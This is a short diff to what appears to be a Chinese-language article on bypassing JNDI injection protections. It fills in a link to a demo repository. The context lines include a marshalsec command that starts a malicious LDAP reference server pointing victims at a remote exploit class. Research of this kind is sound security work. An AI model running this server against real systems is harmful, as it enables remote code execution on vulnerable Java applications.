@@ -271,7 +271,7 @@ Example:
 java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://8.8.8.8:8090/#Exploit 8088
 ```
 
-本文内的相关测试代码见Github -> <>
+本文内的相关测试代码见Github <https://github.com/kxcode/JNDI-Exploit-Bypass-Demo>
 
 
 ## Reference
